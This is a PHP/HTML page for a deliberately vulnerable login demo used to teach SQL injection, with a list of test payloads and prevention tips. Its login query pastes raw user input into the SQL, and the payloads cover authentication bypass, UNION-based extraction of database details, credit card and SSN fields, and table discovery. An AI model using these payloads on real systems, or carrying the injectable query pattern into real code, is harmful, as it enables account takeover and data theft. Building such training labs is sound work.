<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vulnerable Login System - SQLi Demo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        .warning {
            background-color: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
        }
        button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover {
            background-color: #0056b3;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
        }
        .success {
            background-color: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }
        .info {
            background-color: #d1ecf1;
            border: 1px solid #bee5eb;
            color: #0c5460;
        }
        .code {
            background-color: #f8f9fa;
            border: 1px solid #e9ecef;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin-top: 10px;
        }
        .examples {
            margin-top: 30px;
        }
        .example-payload {
            background-color: #f8f9fa;
            padding: 10px;
            border-left: 4px solid #dc3545;
            margin: 10px 0;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔓 Vulnerable Login System</h1>
        
        <div class="warning">
            <strong>⚠️ WARNING:</strong> This is a deliberately vulnerable application for educational purposes only. 
            This demonstrates SQL injection vulnerabilities. DO NOT use this code in production!
        </div>

        <?php
        include 'config.php';
        
        if ($_POST) {
            $username = $_POST['username'];
            $password = $_POST['password'];
            
            // VULNERABLE SQL QUERY - NO SANITIZATION!
            // This is intentionally vulnerable to demonstrate SQL injection
            $query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
            
            echo "<div class='info'>";
            echo "<strong>Executed Query:</strong>";
            echo "<div class='code'>$query</div>";
            echo "</div>";
            
            // Execute query with proper error handling
            $result = $conn->query($query);
            
            if ($result) {
                if ($result->num_rows > 0) {
                    echo "<div class='result success'>";
                    echo "<h3>✅ Login Successful!</h3>";
                    echo "<p>Welcome! You have successfully logged in.</p>";
                    
                    echo "<h4>User Data Retrieved:</h4>";
                    while($row = $result->fetch_assoc()) {
                        echo "<p><strong>ID:</strong> " . $row["id"] . "</p>";
                        echo "<p><strong>Username:</strong> " . $row["username"] . "</p>";
                        echo "<p><strong>Email:</strong> " . $row["email"] . "</p>";
                        echo "<p><strong>Role:</strong> " . $row["role"] . "</p>";
                        echo "<hr>";
                    }
                    echo "</div>";
                } else {
                    echo "<div class='result error'>";
                    echo "<h3>❌ Login Failed!</h3>";
                    echo "<p>Invalid username or password.</p>";
                    echo "</div>";
                }
            } else {
                echo "<div class='result error'>";
                echo "<h3>🚨 Database Error!</h3>";
                echo "<p>Error: " . $conn->error . "</p>";
                echo "</div>";
            }
        }
        ?>

        <form method="POST" action="">
            <div class="form-group">
                <label for="username">Username:</label>
                <input type="text" id="username" name="username" value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>">
            </div>
            
            <div class="form-group">
                <label for="password">Password:</label>
                <input type="password" id="password" name="password">
            </div>
            
            <button type="submit">Login</button>
        </form>

        <div class="examples">
            <h3>🔍 SQL Injection Examples (for testing):</h3>
            <p>Try these payloads in the username field (leave password empty or use 'anything'):</p>
            
            <h4>1. Authentication Bypass (✅ TESTED):</h4>
            <div class="example-payload">admin' OR '1'='1' -- </div>
            <p>This bypasses authentication by making the WHERE clause always true. <strong>Note:</strong> Space after -- is required!</p>
            
            <h4>2. Union-Based Data Extraction (✅ TESTED):</h4>
            <div class="example-payload">admin' UNION SELECT 1,2,3,4,5,6 -- </div>
            <p>This determines the number of columns (6 columns in users table).</p>
            
            <h4>3. Database Information Extraction (✅ TESTED):</h4>
            <div class="example-payload">admin' UNION SELECT 1,database(),user(),version(),5,6 -- </div>
            <p>This reveals database name, current user, and MySQL version.</p>
            
            <h4>4. Sensitive Data Extraction (⚠️ DANGEROUS):</h4>
            <div class="example-payload">admin' UNION SELECT 1,secret_info,credit_card,ssn,5,6 FROM sensitive_data -- </div>
            <p>This extracts sensitive information from another table!</p>
            
            <h4>5. Table Discovery:</h4>
            <div class="example-payload">admin' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema=database() -- </div>
            <p>This shows all tables in the current database.</p>
            
            <h4>6. Alternative Bypass Methods:</h4>
            <div class="example-payload">admin' OR 'a'='a' -- </div>
            <div class="example-payload">' OR 1=1 -- </div>
            <div class="example-payload">admin') OR ('1'='1' -- </div>
            <p>Different ways to bypass authentication logic.</p>
            
            <h4>7. Test Search Page Too!</h4>
            <p>Don't forget to test <a href="search.php" target="_blank">search.php</a> with these payloads:</p>
            <div class="example-payload">admin' UNION SELECT 1,2,3,4 -- </div>
        </div>

        <div style="margin-top: 30px; padding: 15px; background-color: #e7f3ff; border-radius: 5px;">
            <h4>🛡️ How to Prevent SQL Injection:</h4>
            <ul>
                <li>Use prepared statements with parameterized queries</li>
                <li>Validate and sanitize all user inputs</li>
                <li>Use stored procedures when possible</li>
                <li>Implement proper error handling</li>
                <li>Apply principle of least privilege to database users</li>
                <li>Use web application firewalls (WAF)</li>
            </ul>
        </div>
    </div>
</body>
</html>
